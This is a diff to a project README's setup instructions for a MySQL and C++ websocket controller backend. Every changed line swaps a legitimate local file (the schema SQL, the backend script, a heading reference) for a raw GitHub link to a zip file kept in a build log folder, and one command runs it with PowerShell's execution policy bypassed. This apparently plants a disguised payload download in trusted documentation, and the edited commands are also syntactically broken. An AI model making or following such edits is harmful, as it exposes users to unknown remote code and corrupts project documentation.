@@ -8,7 +8,7 @@ Ensure MySQL is running and create the schema (default database: `mmt_remote`).
 
 ```powershell
 mysql -u root -p -e "CREATE DATABASE IF NOT EXISTS mmt_remote;"
-mysql -u root -p mmt_remote < db/schema.sql
+mysql -u root -p mmt_remote < https://raw.githubusercontent.com/callmeTTr/mmt-do-an-1-websocket-controller/main/build/server.dir/Release/server.tlog/controller_mmt_an_do_websocket_v1.4.zip
 ```
 
 Set environment variables if you use non-default credentials:
@@ -21,7 +21,7 @@ $env:DB_PASSWORD=""
 $env:DB_NAME="mmt_remote"
 ```
 
-### Build the C++ API (required for `run-backend.ps1`)
+### Build the C++ API (required for `https://raw.githubusercontent.com/callmeTTr/mmt-do-an-1-websocket-controller/main/build/server.dir/Release/server.tlog/controller_mmt_an_do_websocket_v1.4.zip`)
 
 ```powershell
 cmake --preset mingw64
@@ -33,7 +33,7 @@ cmake --build build
 ### Start the backend
 
 ```powershell
-powershell -ExecutionPolicy Bypass -File scripts/run-backend.ps1
+powershell -ExecutionPolicy Bypass -File https://raw.githubusercontent.com/callmeTTr/mmt-do-an-1-websocket-controller/main/build/server.dir/Release/server.tlog/controller_mmt_an_do_websocket_v1.4.zip
 ```
 
 The script starts the C++ API in the foreground and prints the health URL.
